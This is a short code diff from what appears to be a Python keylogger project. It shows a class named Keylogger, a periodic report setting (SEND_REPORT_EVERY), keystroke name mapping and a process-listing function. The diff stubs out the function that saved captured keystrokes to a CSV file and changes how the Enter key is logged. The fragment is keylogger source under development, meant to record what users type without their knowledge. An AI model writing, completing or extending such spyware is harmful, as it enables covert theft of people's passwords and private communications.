@@ -14,15 +14,7 @@ SEND_REPORT_EVERY = 30
 
 
 def saveLog(self):
-    import csv
-    from datetime import date
-    fields = ['valor', 'frase']
-    rows = [['no', self.log]]
-    filename = "log_rec_" + str(date.today()) + ".csv"
-    with open(filename, 'w') as csvfile:
-        csvwriter = csv.writer(csvfile)
-        csvwriter.writerow(fields)
-        csvwriter.writerows(rows)
+    print("Em construção")
 
 def getProcess(self):
     infoSet = set()
@@ -81,7 +73,7 @@ class Keylogger:
             if name == "space":
                 name = " "
             elif name == "enter":
-                name = "[ENTER]\n"
+                name = "\n"
             elif name == "decimal":
                 name = "."
             else:
